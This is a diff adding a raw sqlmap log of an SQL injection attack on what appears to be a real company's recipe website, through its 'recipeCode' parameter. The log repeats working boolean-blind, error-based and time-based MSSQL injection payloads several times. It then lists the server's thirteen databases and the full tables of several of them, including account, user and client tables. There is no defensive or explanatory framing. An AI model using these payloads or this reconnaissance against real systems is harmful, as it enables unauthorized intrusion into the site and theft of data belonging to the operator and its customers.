@@ -1,0 +1,399 @@
+sqlmap identified the following injection points with a total of 46 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+available databases [13]:
+[*] ALIAnalytics
+[*] ArchivageTiers
+[*] InternetDeliceetCreation
+[*] InternetTerreAzur
+[*] master
+[*] mobilites
+[*] model
+[*] msdb
+[*] PORTAIL_CLIENT
+[*] PortailClient
+[*] PPFSiteInternet1
+[*] regnat
+[*] tempdb
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: Microsoft SQL Server 2005
+Database: ALIAnalytics
+[5 tables]
++-----------------------+
+| ASCDIM_OBJECT_ID      |
+| ASCDIM_OBJECT_TYPE    |
+| ASCDIM_PAGE_NAME      |
+| ASCDIM_URL            |
+| ASCFACT_POMONA_VIEWED |
++-----------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: Microsoft SQL Server 2005
+Database: PortailClient
+[46 tables]
++---------------------------------------------------------+
+| Structure_Orga                                          |
+| VW_TMP_FILTRE                                           |
+| sysdiagrams                                             |
+| portailclient.TBL_ITF_ARTICLE                           |
+| portailclient.TBL_ITF_ARTICLE_DIV                       |
+| portailclient.TBL_ITF_ARTICLE_DIV_WRK                   |
+| portailclient.TBL_ITF_ARTICLE_MANDANT                   |
+| portailclient.TBL_ITF_ARTICLE_MANDANT_WRK               |
+| portailclient.TBL_ITF_ARTICLE_OC                        |
+| portailclient.TBL_ITF_ARTICLE_OC_WRK                    |
+| portailclient.TBL_ITF_CLIENT                            |
+| portailclient.TBL_ITF_CLIENT_WRK                        |
+| portailclient.TBL_ITF_COMMANDE_ACHAT_DETAIL             |
+| portailclient.TBL_ITF_COMMANDE_ACHAT_DETAIL_WRK         |
+| portailclient.TBL_ITF_COMMANDE_ACHAT_ENTETE             |
+| portailclient.TBL_ITF_COMMANDE_ACHAT_ENTETE_WRK         |
+| portailclient.TBL_ITF_COMMANDE_VENTE_DETAIL             |
+| portailclient.TBL_ITF_COMMANDE_VENTE_DETAIL_WRK         |
+| portailclient.TBL_ITF_COMMANDE_VENTE_ENTETE             |
+| portailclient.TBL_ITF_COMMANDE_VENTE_ENTETE_WRK         |
+| portailclient.TBL_ITF_DIALOGUE_CLIENT_DETAIL            |
+| portailclient.TBL_ITF_DIALOGUE_CLIENT_DETAIL_WRK        |
+| portailclient.TBL_ITF_DIALOGUE_CLIENT_ENTETE            |
+| portailclient.TBL_ITF_DIALOGUE_CLIENT_ENTETE_WRK        |
+| portailclient.TBL_ITF_FOURNISSEUR                       |
+| portailclient.TBL_ITF_HIERARCHIE_ARTICLE                |
+| portailclient.TBL_ITF_HIERARCHIE_CLIENT                 |
+| portailclient.TBL_ITF_HIERARCHIE_CLIENT_DETAIL          |
+| portailclient.TBL_ITF_HIERARCHIE_CLIENT_ENTETE          |
+| portailclient.TBL_ITF_HIERARCHIE_CLIENT_WRK             |
+| portailclient.TBL_ITF_STOCK                             |
+| portailclient.TBL_ITF_TRACE                             |
+| portailclientprdpi.TBL_COMMANDE_ACHAT_DETAIL            |
+| portailclientprdpi.TBL_COMMANDE_ACHAT_ENTETE            |
+| portailclientprdpi.TBL_COMMANDE_VENTE_DETAIL            |
+| portailclientprdpi.TBL_COMMANDE_VENTE_ENTETE            |
+| portailclientprdpi.TBL_FILTRE_DIALOGUE_CLIENT_ALL_INC   |
+| portailclientprdpi.TBL_FILTRE_EXPLOIT_ALL_INC           |
+| portailclientprdpi.TBL_FILTRE_GAMME_ALL_INC             |
+| portailclientprdpi.TBL_FILTRE_HIERARCHIE_CLIENT_ALL_INC |
+| portailclientprdpi.TBL_FILTRE_MARQUE_ALL_INC            |
+| portailclientprdpi.TBL_FILTRE_STRUCTCLT_ALL_INC         |
+| portailclientprdpi.TBL_FILTRE_STRUCTPDT_ALL_INC         |
+| portailclientprdpi.TBL_FILTRE_UNIVERS_ALL_INC           |
+| portailclientprdpi.TBL_FILTRE_UNIVERS_ARTICLE           |
+| portailclientprdpi.TBL_STOCK                            |
++---------------------------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: Microsoft SQL Server 2005
+Database: PPFSiteInternet1
+[95 tables]
++----------------------------------------+
+| ACCOUNT                                |
+| ACCOUNT_TEMP                           |
+| ATOUT                                  |
+| AUTRE_PRODUIT                          |
+| BRANCHE                                |
+| CATALOGUES                             |
+| CATALOGUES_COURANT_VIEW                |
+| CATALOGUES_SUIVANT_VIEW                |
+| CATALOGUES_VIEW                        |
+| CATEGORIES_RATTACHEMENT_VIDEO          |
+| CHAPITRE_VIDEO                         |
+| CLIENTS_VIEW                           |
+| CODE_CLIENT                            |
+| CODE_CLIENT_KO                         |
+| CODE_CLIENT_PARAM                      |
+| CODE_PRODUITS                          |
+| COMPOSANT                              |
+| CUISINE_MONDE                          |
+| DOSSIER                                |
+| ENTITE_RATTACHABLE_VIDEO               |
+| ETAPE_RECETTE                          |
+| ETAPE_STYLISME                         |
+| EVENEMENTIEL                           |
+| FAMILLES_PRODUITS                      |
+| HIERARCHIE                             |
+| HIERARCHIESAP                          |
+| IDEE_MENU                              |
+| INFO_FOURNISSEUR                       |
+| INTERLOCUTEUR                          |
+| IN_MENU                                |
+| ITF_GIP                                |
+| ITF_GIP_ATOUT                          |
+| ITF_GIP_AUTRE_PRODUIT                  |
+| ITF_GIP_COMPOSANT                      |
+| ITF_GIP_DELETE                         |
+| ITF_GIP_ETAPE_RECETTE                  |
+| ITF_GIP_HIERARCHIESAP                  |
+| ITF_GIP_INFO_FOURNISSEUR               |
+| ITF_GIP_PRODUIT                        |
+| ITF_GIP_PRODUIT_RECETTE                |
+| ITF_GIP_PRODUIT_RECETTE_DOUBLONS       |
+| ITF_GIP_RECETTE                        |
+| ITF_GIP_UNIVERS_CLIENT                 |
+| KILIVKI                                |
+| LATEST_RECETTE_VIEW                    |
+| LIEN_PRODUIT_UCM                       |
+| LIEN_RECETTE_UCM                       |
+| LIEN_VIDEO_ENTITE                      |
+| MAPPING_INTERNET                       |
+| MAPPING_PORTAL                         |
+| MENU                                   |
+| MENU_PARTIE                            |
+| MOMENT_CONSOMMATION                    |
+| MessageObjet                           |
+| OFFRES_REGIONALES                      |
+| OFFRES_REGIONALES_DETAILS              |
+| OFFRES_REGIONALES_GAMME_NATIONALE_VIEW |
+| PRODUIT                                |
+| PRODUITS_NOUVEAUX_RC_VIEW              |
+| PRODUITS_NOUVEAUX_RS_VIEW              |
+| PRODUITS_NOUVEAUX_VIEW                 |
+| PRODUITS_RC_VIEW                       |
+| PRODUITS_RS_VIEW                       |
+| PRODUIT_CATEGORISATION_SAP             |
+| PRODUIT_MOMENT_CONSOMMATION            |
+| PRODUIT_RECETTE                        |
+| PROMOS_PRODUITS_NATIONAUX_VIEW         |
+| PROMOS_PRODUITS_REGIONAUX_VIEW         |
+| PROMOS_PRODUITS_VIEW                   |
+| PROMOTION                              |
+| PROMOTION_PRODUIT                      |
+| PROP_INTERNET                          |
+| PTUSERS                                |
+| Prospect                               |
+| RECETTE                                |
+| REFERENTIEL_CLIENTS_BY_SITE            |
+| REFERENTIEL_CLIENTS_PARAM              |
+| REFERENTIEL_CLIENTS_PROSPECTS          |
+| REFERENTIEL_PROSPECTS                  |
+| REGION_FRANCE                          |
+| STYLISME                               |
+| THEMATIQUE_CM                          |
+| THEMATIQUE_EVT                         |
+| THEMATIQUE_RF                          |
+| TYPE_COMPOSANT                         |
+| USERS_IDM                              |
+| USERS_PORTAL                           |
+| VIDEO                                  |
+| VIDEOS_ESPACE_PERSO_VIEW               |
+| VIDEO_ECOLE_DES_CHEFS_RS_RC            |
+| produitexcel                           |
+| searchProductFamillyView               |
+| sysdiagrams                            |
+| vDestinationProduit                    |
+| v_tmp_EntitesRattachablesAVideo        |
++----------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+available databases [13]:
+[*] ALIAnalytics
+[*] ArchivageTiers
+[*] InternetDeliceetCreation
+[*] InternetTerreAzur
+[*] master
+[*] mobilites
+[*] model
+[*] msdb
+[*] PORTAIL_CLIENT
+[*] PortailClient
+[*] PPFSiteInternet1
+[*] regnat
+[*] tempdb
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: recipeCode
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 6332=6332
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: recipeCode=36 AND 3455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(116)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (3455=3455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(103)+CHAR(104)+CHAR(113)))
+    Vector: AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)
+    Payload: recipeCode=-7016 OR 4280=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+    Vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)
+---
+web server operating system: Windows
+web application technology: Apache 2.2.10, Servlet 2.5, JSP, JSP 2.1
+back-end DBMS: Microsoft SQL Server 2005
+Database: ALIAnalytics
+[5 tables]
++-----------------------+
+| ASCDIM_OBJECT_ID      |
+| ASCDIM_OBJECT_TYPE    |
+| ASCDIM_PAGE_NAME      |
+| ASCDIM_URL            |
+| ASCFACT_POMONA_VIEWED |
++-----------------------+
+
